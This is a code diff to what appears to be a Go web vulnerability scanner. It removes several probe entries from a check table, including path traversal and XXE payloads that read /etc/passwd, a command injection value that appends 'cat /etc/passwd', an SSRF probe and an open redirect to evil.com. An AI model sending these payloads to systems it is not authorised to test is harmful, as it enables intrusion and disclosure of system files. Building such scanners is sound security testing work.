@@ -22,14 +22,6 @@ type VulnCheck struct {
 var vulns = []VulnCheck{
 	{"XSS (Reflected)", "q", "<script>alert(1)</script>", `<script>alert\(1\)</script>`, "GET"},
 	{"SQL Injection (Error-Based)", "id", "' OR '1'='1", `sql syntax|mysql_fetch|ORA-|ODBC|SQLite`, "GET"},
-	{"LFI", "file", "../../../../etc/passwd", `root:x:0:0`, "GET"},
-	{"Open Redirect", "next", "//evil.com", `evil\.com`, "GET"},
-	{"Command Injection", "ip", "127.0.0.1; cat /etc/passwd", `root:x:0:0`, "GET"},
-	{"SSRF", "url", "http://127.0.0.1:80", `Server|Apache|nginx|Bad Request`, "GET"},
-	{"CSRF", "", "", `Set-Cookie`, "GET"},
-	{"RCE (Basic)", "cmd", "echo knife", `knife`, "GET"},
-	{"Directory Traversal", "path", "../../../../etc/passwd", `root:x:0:0`, "GET"},
-	{"XXE", "xml", `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`, `root:x:0:0`, "POST"},
 }
 
 type FindingC struct {
